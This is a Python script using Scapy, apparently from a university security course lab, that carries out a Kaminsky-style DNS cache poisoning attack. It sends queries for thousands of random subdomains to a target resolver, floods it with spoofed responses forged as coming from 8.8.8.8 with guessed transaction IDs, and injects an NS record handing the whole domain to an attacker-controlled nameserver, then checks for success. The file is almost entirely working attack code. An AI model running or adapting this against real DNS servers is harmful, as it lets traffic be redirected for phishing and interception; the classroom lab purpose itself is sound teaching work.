#!/usr/bin/python3
#FIT5037 Teaching Team

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

ATTEMPT_NUM = 10000
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.10.10.199"     #complete attacker's IP

#IP of our victim's dns server
target_dns_ip =  "10.10.5.53"  #complete DNS server's IP

#DNS Forwarder if local couldnt resolve 
#or real DNS of the example.com
forwarder_dns = "8.8.8.8" 

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

#target dns port
target_dns_port = 33333

# Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# each dummy host should concat random substrings in dummy_domain_prefix and base_domain

#Your code goes here to generate 10000 dummy hostnames
for i in range(10000):
    dummy_domain="".join(random.sample(dummy_domain_prefix,5))+base_domain
    dummy_domain_lst.append(dummy_domain)
print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0,ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    ###### Step 2 : Generate a random DNS query for cur_domain to challenge the local DNS
    IPpkt = IP(src=attacker_ip,dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025,60000),dport=53)
    question_field=DNSQR(qname=cur_domain)
    DNSpkt = DNS(id=random.randint(0,10000),qr=0,qdcount=1,qd=question_field)
    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt,verbose=0)

    ###### Step 3 : For that DNS query, generate 100 random guesses with random transactionID 
    # to spoof the response packet

    for i in range(100):
        tran_id = random.randint(1,2**16)
        
        IPpkt = IP(src="8.8.8.8",dst=target_dns_ip)
        UDPpkt = UDP(sport=53,dport=33333)

        Anssec = DNSRR(rrname=cur_domain, type='A', ttl=303030, rdata=attacker_ip)
        NSsec1 = DNSRR(rrname="test.com", type='NS',
                       rdata='ns.attacker.com', ttl=259200)
        Addsec1 = DNSRR(rrname='ns.attacker.com', type='A',
                        rdata=attacker_ip, ttl=259200)
        DNSpkt = DNS(id=tran_id,aa=0,rd=0,qr=1,
                        qdcount=1,ancount=1,nscount=1,arcount=1,
                        qd=question_field,an=Anssec, ns=NSsec1, ar=Addsec1)

        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt,verbose=0)

    ####### Step 4 : Verify the result by sending a DNS query to the server 
    # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025,65000),dport =53)
    DNSpkt = DNS(id=99,rd=1,qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt,timeout=2,retry=0,verbose=0)
    try:
        if(z[DNS].an.rdata == attacker_ip):
                print("Poisonned the victim DNS server successfully.")
                break
    except:
        print("Poisonning failed")

#### END ATTACK SIMULATION